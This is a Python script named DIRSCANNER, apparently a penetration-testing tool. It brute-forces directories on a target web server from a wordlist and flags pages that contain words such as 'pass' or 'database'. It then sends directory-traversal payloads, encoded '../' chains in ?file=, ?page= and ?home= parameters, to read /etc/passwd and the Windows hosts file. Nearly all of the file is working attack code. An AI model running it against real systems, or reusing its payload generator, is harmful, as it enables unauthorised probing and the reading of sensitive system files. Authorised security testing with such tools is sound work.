#!/usr/bin/env python

from colorama import init, Fore, Back, Style
import argparse
import pyfiglet
import urllib.request
import threading
import queue
import sys
import textwrap
import time
import re
import requests

parser = argparse.ArgumentParser(description='Directory brute-force tool')
parser.add_argument('url', help='Example URL: http://127.0.0.1/')
parser.add_argument('wordlist', help='Example wordlist: /usr/share/wordlists/rockyou.txt')
args = parser.parse_args()

init(autoreset=True)
ascii_banner = pyfiglet.figlet_format('DIRSCANNER')
print(Fore.YELLOW + Back.RED + ascii_banner)
print(Fore.YELLOW + Back.RED + 'Author: Roberto Reigada Rodríguez - roberreigada@gmail.com')

URL = args.url
wordlist = args.wordlist
try:
    response = requests.get(URL, timeout=10)
except:
    print()
    print(Fore.RED + "URL: " + URL + " not found. Please introduce a valid URL\n")
    exit(0)

endwithslash = URL.endswith("/")
if not endwithslash:
	URL = URL + "/"

threads = 10
user_agent = "DirScanner"
extensions = ["", ".html", ".php", ".bak", ".txt"]
dataleak = ["database", "user", "pass", "mail"]

print(Fore.YELLOW + '\nURL: ' + URL)
print(Fore.YELLOW + 'Wordlist: ' + wordlist)
print(Fore.YELLOW + 'Threads: ' + str(threads))
print(Fore.YELLOW + 'User Agent: ' + user_agent)
print(Fore.YELLOW + 'File extensions: ' + str(extensions))
print(Fore.YELLOW + 'Leak words: ' + str(dataleak))
print('\n')

def build_wordlist(wordlist_file):
	try:
		fd = open(wordlist_file,"rb")
		raw_words = fd.readlines()
		fd.close()
		words = queue.Queue()
		for word in raw_words:
			word = word.rstrip()
			if (not(word.decode("utf-8").startswith('#'))) and (word.decode("utf-8") != ''):
				words.put(word)
		return words
	except:
		print(Fore.RED + wordlist_file + " file not found. Please introduce a valid wordlist\n")
		exit(0)

def check_dataleaks(urlResponse):
	htmlPage = urlResponse.readlines()
	dataLeaked = False
	for htmlLine in htmlPage:
		for word in dataleak:
			if word.encode().lower() in htmlLine.lower():
				if dataLeaked == False:
					print(Fore.GREEN + '    Possible data leak in ' + str(urlResponse.geturl()))
					dataLeaked = True
				print(Fore.RED + '    ' + textwrap.dedent(str(htmlLine.decode("utf-8"))).rstrip())
			
def bruteforce_dir(wordqueue, sitesfound):
	while not wordqueue.empty():
		attempt = wordqueue.get()
		attempt = attempt.decode("utf-8")
		for extension in extensions:
			URLToCheck = URL + attempt + extension
			req = urllib.request.Request(
				URLToCheck, 
				data=None, 
				headers={
				'User-Agent': user_agent
				}
			)
			try:
				urlResponse = urllib.request.urlopen(req, timeout=10)
				responseCode = urlResponse.code
				print(Fore.GREEN + '[' + str(responseCode) + '] => ' + URLToCheck)
				sitesfound.put(URLToCheck)
				check_dataleaks(urlResponse)
			except urllib.error.HTTPError as e:
				if(e.code == 403):
					print(Fore.GREEN + '[' + str(e.code) + '] => ' + URLToCheck)
					sitesfound.put(URLToCheck)
			except urllib.error.URLError as e:
				pass
			except Exception as e:
				pass

def gen_traversal_payload(URL):
	file = ["?file=", "?home=", "?page="]
	dots = ["..", "%2e%2e", "%252e%252e"]
	slashes = ["/", "%2f", "%252f", "\\", "%5c", "%255c"]
	interestingfiles = ["etc/passwd", "windows\system32\drivers\etc\hosts"]
	travpayload = queue.Queue()
	if '.php' in URL:
		URLsplitted = re.split('.php', URL, flags=re.IGNORECASE)
		URLsplitted = URLsplitted[0] + '.php'
		for i in range(len(file)):
			for j in range(len(dots)):
				for k in range(len(slashes)):
					payload = file[i]
					for h in range(7):
						payload = payload + dots[j] + slashes[k]
						for l in range(len(interestingfiles)):
							payloadfinal = payload + interestingfiles[l]
							URLfinal = URLsplitted + payloadfinal
							travpayload.put(URLfinal)					
	return travpayload
					
def check_directory_traversal(travqueue):
	global dirTraversal
	global found
	while not travqueue.empty():
		attempt = travqueue.get()
		URLsplitted = re.split('.php', attempt, flags=re.IGNORECASE)
		URLsplitted = URLsplitted[0] + '.php'
		req = urllib.request.Request(
					URLsplitted, 
					data=None, 
					headers={
					'User-Agent': user_agent
					}
		)
		urlResponse = urllib.request.urlopen(req, timeout=10)
		htmlPage = urlResponse.readlines()
		req = urllib.request.Request(
					attempt,
					data=None,
					headers={
						'User-Agent': user_agent
					}
		)
		try:
			urlFinalResponse = urllib.request.urlopen(req, timeout=10)
			htmlPagePayload = urlFinalResponse.readlines()
			if htmlPagePayload != htmlPage:
				print(Fore.RED + "    " + str(urlFinalResponse.geturl()))
				dirTraversal = True
				found = True
		except:
			pass
				
def progress(wordqueue):
	startqueuesize = wordqueue.qsize()
	while not wordqueue.empty():
		done = startqueuesize - wordqueue.qsize()
		percent = round((done / startqueuesize) * 100, 2)
		print(Fore.CYAN + "Progress: " + str(done) + "/" + str(startqueuesize) + " => " + str(percent) + "%" + " ", end='\r')
		sys.stdout.flush()
		time.sleep(1)
	print("                                   ")

def main():
	word_queue = build_wordlist(wordlist)
	sites_found = queue.Queue()	
	print(Fore.BLACK + Back.WHITE + "Directory enumeration: ")
	for i in range(threads):
		t = threading.Thread(target=bruteforce_dir,args=(word_queue,sites_found,))
		t.start()
		
	t2 = threading.Thread(target=progress,args=(word_queue,))
	t2.start()
	t2.join()
	global dirTraversal
	dirTraversal = False
	global found 
	found = False
	print(Fore.BLACK + Back.WHITE + "Possible directory traversal: ")
	
	while not sites_found.empty():
		found = False
		url = sites_found.get()
		print(Fore.GREEN + "Trying " + str(url))
		travpayload_queue = gen_traversal_payload(url)
		threadsarr = []
		for i in range(threads):
			t = threading.Thread(target=check_directory_traversal,args=(travpayload_queue,))
			threadsarr.append(t)
		for x in threadsarr:
			x.start()
		for x in threadsarr:
			x.join()
		if found == False:
			print("    No directory traversal found")
				
	if dirTraversal:
		print("                                   ")
	else:
		print(Fore.CYAN + "No results for directory traversal vulnerabilities")
	exit(0)

if __name__ == "__main__":
    main()
